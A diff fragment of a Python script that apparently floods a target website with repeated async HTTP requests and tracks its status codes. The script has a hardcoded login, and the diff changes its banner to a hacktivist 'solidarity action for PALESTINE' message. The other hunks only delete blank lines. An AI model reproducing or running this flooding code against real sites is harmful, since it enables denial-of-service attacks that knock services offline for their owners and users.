@@ -77,7 +77,7 @@ while attemps < 100:
     password = input("\033[38;5;111m┗> Password: \033[37m")
 
     if username == 'swk00' and password == 'swk00':
-        print("\033[32m⟩⟩ Hai...! Welcome \033[0m")
+        print("\033[32m⟩⟩ Aksi solidaritas untuk PALESTINE \033[0m")
         break
     else:
         print('Incorrect credentials. Check if you have Caps lock on and try again.')
@@ -108,7 +108,6 @@ async def fetch(session, url):
           set_final = start - set_end
           final = str(set_final).replace("-", "")
          
-          
           if response.status == 200:
             r += 1
           reqs.append(response.status)
@@ -118,8 +117,6 @@ async def fetch(session, url):
           sys.stdout.write(f"\033[38;5;37mWebsite \033[38;5;166m{str(url)} \033[38;5;39mStatus Code \033[32m•> {str(response.status)}\r") 
         else:
           print(Colorate.Horizontal(Colors.red_to_green, "[-] Server is not responding"))
-
-
 
 urls = []
 urls.append(url)
@@ -133,7 +130,6 @@ async def main():
 
 def run():
     loop.run_forever(asyncio.run(main()))
-
 
 if __name__ == '__main__':
   active = []
